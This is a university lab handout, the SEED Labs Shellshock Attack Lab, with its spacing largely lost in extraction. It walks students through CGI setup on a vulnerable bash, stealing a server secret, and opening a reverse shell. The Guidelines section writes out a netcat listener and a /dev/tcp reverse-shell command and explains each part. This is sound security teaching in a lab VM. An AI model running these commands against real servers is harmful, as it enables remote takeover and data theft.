SEEDLabsŒShellshockAttackLab 1 ShellshockAttackLab Copyright©2006-2016WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1318814.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1Overview OnSeptember24,2014 aseverevulnerabilityinBashwasNicknamedShellshock thisvul- nerabilitycanexploitmanysystemsandbelaunchedeitherremotelyorfromalocalmachine.Inthislab studentsneedtoworkonthisattack sotheycanunderstandtheShellshockvulnerability.Thelearning objectiveofthislabisforstudentstogetaexperienceonthisinterestingattack understandhow itworks andthinkaboutthelessonsthatwecangetoutofthisattack.Theversionofthislabwasde- velopedonSeptember29,2014 justvedaysaftertheattackwasreported.Itwasassignedtothestudents inourComputerSecurityclassonSeptember30,2014.AnimportantmissionoftheSEEDprojectisto quicklyturnrealattacksintoeducationalmaterials soinstructorscanbringthemintotheirclassroomsin atimelymannerandkeeptheirstudentsengagedwithwhathappensintherealworld.Thislabcoversthe followingtopics Ł Shellshock Ł Environmentvariables Ł FunctioninBash Ł ApacheandCGIprograms Readings DetailedcoverageoftheShellshockattackcanbefoundinChapter3oftheSEEDbook ComputerSecurity AHands-onApproach byWenliangDu Labenvironment Thislabhasbeentestedonourpre-builtUbuntu16.04VM whichcanbedownloaded fromtheSEEDwebsite 2LabTasks 2.1Task1 ExperimentingwithBashFunction TheBashprograminUbuntu16.04hasalreadybeenpatched soitisnolongervulnerabletotheShellshock attack.Forthepurposeofthislab wehaveinstalledavulnerableversionofBashinsidethe /bin folder itsnameis bash shellshock .WeneedtousethisBashinourtask.Pleaserunthisvulnerableversion ofBashlikethefollowingandthendesignanexperimenttoverifywhetherthisBashisvulnerabletothe Shellshockattackornot $ /bin/bash_shellshock Trythesameexperimentonthepatchedversionofbash /bin/bash andreportyourobservations SEEDLabsŒShellshockAttackLab 2 2.2Task2 SettingupCGIprograms Inthislab wewilllaunchaShellshockattackonaremotewebserver.ManywebserversenableCGI whichisastandardmethodusedtogeneratedynamiccontentonWebpagesandWebapplications.Many CGIprogramsarewrittenusingshellscripts.Therefore beforeaCGIprogramisexecuted ashellprogram willbeinvokedandsuchaninvocationistriggeredbyauserfromaremotecomputer.Iftheshell programisavulnerableBashprogram wecanexploittheShellshockvulnerabletogainprivilegesonthe server Inthistask wewillsetupaverysimpleCGIprogram called myprog.cgi likethefollowing.It simplyprintsout '' HelloWorld '' usingashellscript # ! /bin/bash_shellshock À echo '' Content-type text/plain '' echo echo echo '' HelloWorld '' Pleasemakesureyouuse /bin/bash shellshock inLine À insteadofusing /bin/bash .The linewhatshellprogramshouldbeinvokedtorunthescript.Wedoneedtousethevulnerable Bashinthislab.PleaseplacetheaboveCGIprograminthe /usr/lib/cgi-bin directoryandsetits permissionto755 soitisexecutable .Youneedtousetherootprivilegetodothese asthefolderisonly writablebytheroot.ThisfolderisthedefaultCGIdirectoryfortheApachewebserver ToaccessthisCGIprogramfromtheWeb youcaneitheruseabrowserbytypingthefollowingURL http //localhost/cgi-bin/myprog.cgi orusethefollowingcommandlineprogram curl dothesamething $ curlhttp //localhost/cgi-bin/myprog.cgi Inoursetup weruntheWebserverandtheattackfromthesamecomputer andthatiswhyweuse localhost .Inrealattacks theserverisrunningonaremotemachine andinsteadofusing localhost weusethehostnameortheIPaddressoftheserver 2.3Task3 PassingDatatoBashviaEnvironmentVariable ToexploitaShellshockvulnerabilityinaBash-basedCGIprogram attackersneedtopasstheirdatatothe vulnerableBashprogram andthedataneedtobepassedviaanenvironmentvariable.Inthistask weneed toseehowwecanachievethisgoal.YoucanusethefollowingCGIprogramtodemonstratethatyoucan sendoutanarbitrarystringtotheCGIprogram andthestringwillshowupinthecontentofoneofthe environmentvariables # ! /bin/bash_shellshock echo '' Content-type text/plain '' echo echo '' ****** EnvironmentVariables ****** '' strings/proc/ $ $ /environ À Inthecodeabove Line À printsoutthecontentsofalltheenvironmentvariablesinthecurrentprocess Ifyourexperimentissuccessful youshouldbeabletoseeyourdatastringinthepagethatyougetbackfrom theserver.Inyourreport pleaseexplainhowthedatafromaremoteusercangetintothoseenvironment variables SEEDLabsŒShellshockAttackLab 3 2.4Task4 LaunchingtheShellshockAttack AftertheaboveCGIprogramissetup wecannowlaunchtheShellshockattack.Theattackdoesnot dependonwhatisintheCGIprogram asittargetstheBashprogram whichisinvokedbeforetheCGI scriptisexecuted.YourgoalistolaunchtheattackthroughtheURL http //localhost/cgi-bin/ myprog.cgi suchthatyoucanachievesomethingthatyoucannotdoasaremoteuser.Inthistask shoulddemonstratethefollowing Ł UsingtheShellshockattacktostealthecontentofasecretfromtheserver Ł Answerthefollowingquestion willyoubeabletostealthecontentoftheshadow /etc/shadow ? Whyorwhynot ? 2.5Task5 GettingaReverseShellviaShellshockAttack TheShellshockvulnerabilityallowsattackstorunarbitrarycommandsonthetargetmachine.Inrealattacks insteadofhard-codingthecommandintheirattack attackersoftenchoosetorunashellcommand sothey canusethisshelltorunothercommands foraslongastheshellprogramisalive.Toachievethisgoal attackersneedtorunareverseshell Reverseshellisashellprocessstartedonamachine withitsinputandoutputbeingcontrolledby somebodyfromaremotecomputer.Basically theshellrunsonthevictim'smachine butittakesinput fromtheattackermachineandalsoprintsitsoutputontheattacker'smachine.Reverseshellgivesattackers aconvenientwaytoruncommandsonacompromisedmachine.Detailedexplanationofhowtocreate reverseshellcanbefoundinChapter3 §3.4.5 intheSEEDbook.Wealsosummarizetheexplanationin theguidelinesectionlater Inthistask youneedtodemonstratehowtolaunchareverseshellviatheShellshockvulnerabilityin aCGIprogram.Pleaseshowhowyoudoit.Inyourreport pleasealsoexplainhowyousetupthereverse shell andwhyitworks.Basically youneedtouseyourownwordstoexplainhowreverseshellworksin yourShellshockattack 2.6Task6 UsingthePatchedBash Now letususeaBashprogramthathasalreadybeenpatched.Theprogram /bin/bash isapatched version.PleasereplacethelineofyourCGIprogramswiththisprogram.RedoTasks3and5and describeyourobservations 3Guidelines CreatingReverseShell Thekeyideaofreverseshellistoredirectitsstandardinput output anderrordevicestoanetworkconnec- tion sotheshellgetsitsinputfromtheconnection andprintsoutitsoutputalsototheconnection.Atthe otherendoftheconnectionisaprogramrunbytheattacker theprogramsimplydisplayswhatevercomes fromtheshellattheotherend andsendswhateveristypedbytheattackertotheshell overthenetwork connection Acommonlyusedprogrambyattackersis netcat ifrunningwiththe '' -l '' option becomes aTCPserverthatlistensforaconnectionontheport.Thisserverprogrambasicallyprintsout whateverissentbytheclient andsendstotheclientwhateveristypedbytheuserrunningtheserver.Inthe followingexperiment netcat nc forshort isusedtolistenforaconnectiononport 9090 letusfocus onlyontheline SEEDLabsŒShellshockAttackLab 4 Attacker 10.0.2.6 $ nc-l9090-v Ù Waitingforreverseshell Connectionfrom10.0.2.5port9090 tcp/ * accepted Server 10.0.2.5 $ Ù Reverseshellfrom10.0.2.5 Server 10.0.2.5 $ ifconfig ifconfig eth23Linkencap EthernetHWaddr08:00:27 fd:25:0f inetaddr 10.0.2.5 Bcast:10.0.2.255Mask:255.255.255.0 inet6addr fe80 :a00:27ff fefd:250f/64Scope Link ... Theabove nc commandwillblock waitingforaconnection.Wenowdirectlyrunthefollowing bash programontheServermachine 10.0.2.5 toemulatewhatattackerswouldrunaftercompromising theserverviatheShellshockattack.This bash commandwilltriggeraTCPconnectiontotheattacker machine'sport9090 andareverseshellwillbecreated.Wecanseetheshellpromptfromtheaboveresult indicatingthattheshellisrunningontheServermachine wecantypethe ifconfig commandtoverify thattheIPaddressisindeed 10.0.2.5 theonebelongingtotheServermachine.Hereisthe bash command Server 10.0.2.5 $ /bin/bash-i > /dev/tcp/10.0.2.6/90900 < & 12 > & 1 Theabovecommandrepresentstheonethatwouldnormallybeexecutedonacompromisedserver.Itis quitecomplicated andwegiveadetailedexplanationinthefollowing Ł '' /bin/bash-i '' Theoption standsforinteractive meaningthattheshellmustbeinteractive mustprovideashellprompt Ł '' > /dev/tcp/10.0.2.6/9090 '' Thiscausestheoutputdevice stdout oftheshelltobe redirectedtotheTCPconnectionto 10.0.2.6 'sport 9090 .In Unix systems stdout 's descriptoris 1 Ł '' 0 < & 1 '' Filedescriptor 0 representsthestandardinputdevice stdin .Thisoptiontellsthesystem tousethestandardoutputdeviceasthestardardinputdevice.Since stdout isalreadyredirectedto theTCPconnection thisoptionbasicallyindicatesthattheshellprogramwillgetitsinputfromthe sameTCPconnection Ł '' 2 > & 1 '' Filedescriptor 2 representsthestandarderror stderr .Thiscausestheerroroutputtobe redirectedto stdout whichistheTCPconnection Insummary thecommand '' /bin/bash-i > /dev/tcp/10.0.2.6/90900 < & 12 > & 1 '' starts bash shellontheservermachine withitsinputcomingfromaTCPconnection andoutputgoingtothe sameTCPconnection.Inourexperiment whenthe bash shellcommandisexecutedon 10.0.2.5 connectsbacktothe netcat processstartedon 10.0.2.6 .Thisisviathe '' Connection from10.0.2.5port9090 tcp/ * accepted '' messagedisplayedby netcat 4Submission Youneedtosubmitadetailedlabreporttodescribewhatyouhavedoneandwhatyouhaveobserved includingscreenshotsandcodesnippets.Youalsoneedtoprovideexplanationtotheobservationsthatare interestingorsurprising.Youareencouragedtopursuefurtherinvestigation beyondwhatisrequiredbythe labdescription.Yourcanearnbonuspointsforextraefforts atthediscretionofyourinstructor 